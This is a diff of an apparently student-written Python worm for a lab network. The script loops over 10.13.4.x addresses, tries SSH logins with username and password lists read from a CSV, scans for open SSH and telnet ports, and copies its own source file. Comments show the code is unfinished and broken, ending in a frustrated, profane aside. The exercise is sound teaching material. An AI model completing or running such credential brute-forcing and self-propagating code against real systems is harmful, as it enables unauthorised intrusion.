@@ -28,12 +28,16 @@ while True: #infinite loop, instant start
 import telnetlib 
 import socket
 import paramiko
-import csv
-from itertools import product
+import pandas
 #recommended libraries; attempting to follow slides example
 
-usernames = [f""] #TODO: grab from csv
-passwords = [f""] #TODO: grab from csv
+import os
+import sys
+#file transfer
+
+with open('Q2.csv', 'r') as csvfile:
+    usernames = pandas.read_csv("Q2.csv")["user"].tolist() 
+    passwords = pandas.read_csv("Q2.csv")["password"].tolist() 
 IpAddr = "10.13.4." 
 lastdigit = range(0, 25) #test all IPs
 
@@ -48,18 +52,12 @@ while True: #infinite loop, instant start
                 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 client.connect(ip, username=user, password=password)
 
-                #   TODO: execute attacker commands here
+                #   execute attacker commands here
                     #"attacker commands" output two files, open_ssh.log and open_telnet.log
                     #contains list of IPs with open ssh and telnet ports respectively
 
                 def find_vulnerable_machines():
-                
-                    #These files should contain a list of IPs that correspond to 
-                    #machines that have open ssh and open telnet ports, respectively.
-
                     #test for open ports
-                    
-
 
                     open_ssh = []
                     open_telnet = []
@@ -78,14 +76,17 @@ while True: #infinite loop, instant start
                             tn.close()
                         except:
                             pass
-
+                find_vulnerable_machines() 
                 # copy this worm program to remote machine
-                #find_vulnerable_machines()  
-                # ^ place here or between open and close?
 
+#make a new file, 
+with open('firstworm.py', 'r') as source:            
+    with open('firstworm_copy.py', 'a') as dest:
+        dest.writelines(source) # inject worm
 
-                # execute worm on remote machine
+            # execute worm on remote machine
 
+#i think, open terminal, python3 firstworm.py
                 
                 # disconnect
                 client.close()
@@ -94,8 +95,7 @@ while True: #infinite loop, instant start
 
 
 if __name__ == "__main__":
-    #check_port()
-    find_vulnerable_machines()
+    
 
     #TODO: question2 part 3. 
     # sob sob im seething none of our code works at fucking all not even the TA's literal own example code 
